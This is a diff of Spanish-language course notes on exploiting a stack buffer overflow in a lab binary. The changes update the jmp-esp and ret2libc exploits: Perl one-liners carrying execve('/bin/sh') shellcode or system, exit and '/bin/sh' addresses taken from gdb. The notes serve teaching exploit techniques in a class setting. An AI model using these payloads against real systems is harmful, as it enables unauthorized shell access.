@@ -38,13 +38,13 @@ Autor: Gabriel Maciá
 	Evita tener que conocer la posición exacta del buffer. Es similar a la anterior, pero en este caso escribirmos el payload después del savedEIP y en el savedEIP llamamos a una instrucción JMP $ESP.
 		
 		root@kali:~/# /usr/share/framework2/msfelfscan -f ./vuln -j esp
-		0x08049444   jmp esp
+		0x08049461   jmp esp
 		 
 	A veces no se encuentra esta instruccion, pero se puede encontrar entrelazada en otras instrucciones, dado que jmp $esp es \xff\xe4
 	
 	La explotación se consigue entonces asi: 
 	
-		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x44\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x61\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 
 6) Técnica ret2libc. 
 
@@ -57,19 +57,23 @@ Autor: Gabriel Maciá
 	Utilizamos entonces la técnica ret2libc (explicación en clase)
 	
 		(gdb) p system  (nota: hacer antes break main y run para que se cargue la libc)
-		$1 = {<text variable, no debug info>} 0xf7e0c980 <system>
+		$1 = {<text variable, no debug info>} 0xf7e0ab30 <system>
 		(gdb) find &system,+9999999,"/bin/sh"
-		0xf7f4caaa
+		0xf7f4aaaa
 		warning: Unable to access 16000 bytes of target memory at 0xf7faa6b2, halting search.
 		1 pattern found.
 	
 	Resultados obtenidos: 
-		system:  0xf7e0c980
-		/bin/sh: 0xf7f4caaa  
+		system:  0xf7e0ab30
+		/bin/sh: 0xf7f4aaaa  
 	
 	Payload a ejecutar: 
-		./vuln1_stack `perl -e 'print "A"x500 . "B"x16 . "\x80\xc9\xe0\xf7" . "AAAA" . "\xaa\xca\xf4\xf7"'`
+		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "AAAA" . "\xaa\xaa\xf4\xf7"'`
 
+	Ahora ponemos también la función exit en el regreso para evitar el segmentation fault:
+		exit: 0xf7dfdb30
+
+		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "\x30\xdb\xdf\xf7" . "\xaa\xaa\xf4\xf7"'`
 
 5) Técnica ROP: 
 	Con esta técnica se va a ejecutar /bin/bash utilizando las funciones que aparecen en el ejecutable y que no se utilizan. Se ejecutarán de forma encadenada. Ver script rop.py para encontrar la solución. 
